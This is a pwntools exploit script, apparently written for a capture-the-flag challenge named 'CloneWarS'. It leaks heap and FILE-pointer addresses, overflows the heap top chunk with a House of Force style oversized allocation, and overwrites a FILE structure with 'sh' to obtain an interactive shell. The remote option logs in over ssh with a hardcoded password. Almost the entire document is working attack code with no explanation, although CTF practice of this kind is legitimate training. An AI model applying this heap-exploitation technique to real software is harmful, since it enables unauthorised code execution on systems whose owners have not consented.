from pwn import *
filename = "./CloneWarS"
elf = ELF(filename)
context.arch = 'amd64'

def getConn():
    return process(filename) if not args.REMOTE else process("sshpass -p 12345678 ssh -p 7000 -tt yeet@ctf2.kaf.sh".split())

def get_PIE(proc):
    memory_map = open("/proc/{}/maps".format(proc.pid),"rb").readlines()
    return int(memory_map[0].split("-")[0],16)

def debug(bp):
    script = ""
    PIE = get_PIE(r)
    PAPA = PIE
    for x in bp:
        script += "b *0x%x\n"%(PIE+x)
    gdb.attach(r,gdbscript=script)

def r2d2(n):
    r.sendlineafter('Your choice: ', '2')
    r.sendlineafter('R2? ', '2')

def pstarships(size, kind, capacity):
    r.sendlineafter('Your choice: ', '3')
    r.sendlineafter('Master, the amount of starships: ', str(size))
    r.sendlineafter('What kind of starships?: ', kind)
    r.sendlineafter('Capacity of troopers in the starships: ', str(capacity))

def lightsabers(nLs, color):
    r.sendlineafter('Your choice: ', '5')
    r.sendafter('How many lightsabers do you think you will need?: ', '\n')
    r.sendline(str(nLs))
    r.sendafter('What color would you like on your light sabers: ', color)

def buildDeathStar(size):
    r.sendlineafter('Your choice: ', '1')
    r.sendlineafter('Assemble death star: ',str(size))
    
context.terminal = ['tmux', 'new-window']
r = getConn()

# LEAKING HEAP
pstarships(0x30, 'A', 0x30)
r2d2(-1)
r.recvuntil('R2D2 IS .... ')
HEAP_L = int(r.recvregex(r'(\d+) '))
log.info('HEAP ADDR 0x%x'% HEAP_L)

if not args.REMOTE and args.GDB:
    debug([0xB0F,0xC3C,0xA7D, 0xE00]) # 0xD94
# OVERFLOW TOP_CHUNK
pstarships(0x30, "FF", 0x40) # Overflow Top Chunk

# LEAK FILE PTR
r.sendlineafter('Your choice: ', '6')
r.recvuntil('File is at: ')
FILE = int(r.recvline().rstrip())
log.info("FILE ADDR 0x%x" % FILE)


HEAP = HEAP_L-0x1380 # HEAPBASE
SIZE_OF_LONG = 0x8 # sizeof(long) -> 8 in 64 bits
WILD_OFFSET = 0x12e0 # Current TOP_CHUNK offset
TOP_CHUNK = HEAP+WILD_OFFSET+SIZE_OF_LONG*4
r.sendlineafter('Your choice: ', '1')
buildDeathStar(FILE-TOP_CHUNK) # Calculate the evil size required to write to FILE
r.sendlineafter('Your choice: ', '4')
r.sendlineafter('What kind of troopers?: ', 'sh') # Modify file with sh
r.sendlineafter('Your choice: ', '6') # Trigger system("sh")
r.interactive()
r.close()